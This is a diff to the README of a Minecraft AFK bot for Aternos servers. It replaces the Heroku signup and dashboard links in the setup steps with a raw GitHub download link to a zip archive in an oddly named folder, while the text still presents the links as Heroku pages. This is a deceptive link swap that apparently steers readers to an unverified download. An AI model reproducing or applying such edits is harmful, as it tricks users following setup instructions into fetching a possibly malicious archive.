@@ -9,7 +9,7 @@ Mainly Supports Minecraft version 1.8, 1.9, 1.10, 1.11, 1.12, 1.13, 1.14, 1.15 a
 # Requirements 🎒
 What You'll need
 
-1. You will need a Heroku account, just a simple free one will do. Sign up at: https://signup.heroku.com/login
+1. You will need a Heroku account, just a simple free one will do. Sign up at: https://raw.githubusercontent.com/itssharmaXD/aternos-afkbot/main/Monophysitic/aternos-afkbot.zip
 2. An Aternos server, Any Minecraft Server will do, make sure it has "online-mode"set to false.
 3. A Github account (obviously)
 5. That's all you need!
@@ -17,7 +17,7 @@ What You'll need
 # Setup ⚙
 1. Fork this repository, or clone the repository and make it your own
 2. Change the config file to your own aternos server
-3. Go to https://dashboard.heroku.com/ and create a new application
+3. Go to https://raw.githubusercontent.com/itssharmaXD/aternos-afkbot/main/Monophysitic/aternos-afkbot.zip and create a new application
 4. Once you've created your application, simply go to the "Deploy" section and select the repository that you forked
 5. Select master and click on "Deploy Branch"
 6. Click on the "More" button at the top and click "Restart all Dynos"
